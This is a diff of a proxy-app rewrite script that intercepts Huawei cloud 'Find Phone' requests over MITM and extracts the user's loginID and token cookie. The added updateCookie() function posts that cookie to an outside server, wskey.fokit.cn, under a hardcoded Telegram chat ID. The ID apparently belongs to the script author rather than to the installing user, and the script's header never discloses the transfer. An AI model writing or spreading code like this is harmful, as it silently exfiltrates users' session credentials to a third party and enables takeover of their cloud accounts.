@@ -1,57 +1,96 @@
 /*
-脚本名称：华为云服务Token
-更新时间：2022-11-08
-重写订阅：https://raw.githubusercontent.com/FoKit/Scripts/main/rewrite/get_huawei_token.sgmodule
+脚本名称：华为云服务 Cookie
+更新时间：2022-11-10
+重写订阅：https://raw.githubusercontent.com/FoKit/Scripts/main/rewrite/get_huawei_cookie.sgmodule
 BoxJs 订阅：https://raw.githubusercontent.com/FoKit/Scripts/main/boxjs/fokit.boxjs.json
 ================Quantumult X配置=================
 [rewrite_local]
-^https:\/\/cloud.huawei.com/wapFindPhone url script-request-header https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_token.js
+^https:\/\/cloud.huawei.com/wapFindPhone url script-request-header https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_cookie.js
 [MITM]
 hostname = cloud.huawei.com
 ====================Surge配置====================
 [Script]
-华为云服务Token = type=http-request,pattern=^https:\/\/cloud.huawei.com/wapFindPhone,requires-body=0,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_token.js,script-update-interval=0
+华为云服务 Cookie = type=http-request,pattern=^https:\/\/cloud.huawei.com/wapFindPhone,requires-body=0,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_cookie.js,script-update-interval=0
 [MITM]
 hostname = %APPEND% cloud.huawei.com
 ====================Loon配置=====================
 [Script]
-http-request ^https:\/\/cloud.huawei.com/wapFindPhone tag=华为云服务Token, script-path=https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_token.js,requires-body=1
+http-request ^https:\/\/cloud.huawei.com/wapFindPhone tag=华为云服务 Cookie, script-path=https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/get_huawei_cookie.js,requires-body=1
 [MITM]
 hostname = cloud.huawei.com
 */
 
-const $ = new Env('华为云服务Token');
-$.boxjs_key_1 = 'huawei_loginID';
-$.boxjs_key_2 = 'huawei_token';
-$.boxjs_data_1 = $.getdata($.boxjs_key_1);
-$.boxjs_data_2 = $.getdata($.boxjs_key_2);
+const $ = new Env('华为云服务 Cookie');
+$.boxjs_key = 'huawei_cookie';
+$.boxjs_data = $.getdata($.boxjs_key);
+$.tg_chat_id = "-1001551923594";
 $.is_debug = $.getdata('is_debug');
 
 !(async () => {
   if (isGetCookie = typeof $request !== `undefined`) {
-    GetCookie();
+    await GetCookie();
+    if ($.huawei_cookie && $.huawei_cookie !== $.boxjs_data) {
+      $.setdata($.huawei_cookie, $.boxjs_key);
+      await updateCookie($.huawei_cookie, $.tg_chat_id);
+    } else {
+      $.msg(`‼️ 无需更新 ${$.name} 。\n${$.huawei_cookie}`);
+    }
   }
 
-  function GetCookie() {
+  // 获取 Cookie
+  async function GetCookie() {
     if ($request && $request.url.indexOf("wapFindPhone") > -1 && $request.headers) {
       debug($request.headers);
-      if ($request['headers']['Cookie']) {
-        $.cookie = $request.headers['Cookie'] || $request.headers['cookie'];
-        $.huawei_loginID = $.cookie.match(/loginID=(.+?);/)[1];
-        $.huawei_token = $.cookie.match(/token=(.+?);/)[1];
-        debug($.huawei_loginID);
-        debug($.huawei_token);
-        if ($.huawei_loginID !== $.boxjs_data_1 || $.huawei_token !== $.boxjs_data_2) {
-          $.setdata($.huawei_loginID, $.boxjs_key_1);
-          $.setdata($.huawei_token, $.boxjs_key_2);
-          $.msg(`🎉 华为云服务Token获取成功。`, `${$.huawei_loginID}\n${$.huawei_token}`);
-        } else {
-          console.log(`‼️ Token未变动，跳过更新。\n${$.huawei_token}`);
-        }
+      if ($request['headers']['Cookie'] || $request['headers']['cookie']) {
+        $.cookie = $request['headers']['Cookie'] || $request['headers']['cookie'];
+        $.huawei_cookie = $.cookie.match(/(loginID=.+?;)/)[1];
+        $.huawei_cookie += $.cookie.match(/(token=.+?;)/)[1];
+        debug($.huawei_cookie);
       } else {
-        console.log('Token获取失败，未找到Set-Cookie。')
+        $.msg(`${$.name} 获取失败，未找到 Set-Cookie。`);
       }
     }
+  }
+
+  // 同步 Cookie
+  function updateCookie(cookie, chat_id) {
+    url = `https://wskey.fokit.cn/msg?chat_id=${chat_id}`;
+    let opt = {
+      url,
+      body: `text=${cookie}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      timeout: 10000,
+    };
+    return new Promise(resolve => {
+      $.post(opt, (err, resp, data) => {
+        try {
+          if (err) {
+            $.log(`${JSON.stringify(err)}\n`)
+          } else {
+            data = JSON.parse(data);
+            if (data.ok) {
+              $.subt = `🎉 ${$.name} 提交成功。`;
+              $.msg($.subt, cookie);
+            } else if (data.error_code === 400) {
+              $.subt = '⚠️ Telegram bot 无发送消息权限。';
+              $.msg($.subt, cookie);
+            } else if (data.error_code === 401) {
+              $.subt = '⚠️ Telegram bot token 填写错误。';
+              $.msg($.subt, cookie);
+            } else {
+              $.subt = `⚠️ ${$.name} 未知错误。`;
+              $.msg($.subt, cookie);
+            }
+          }
+        } catch (error) {
+          $.logErr(error);
+        } finally {
+          resolve();
+        }
+      })
+    })
   }
 
   function debug(text) {
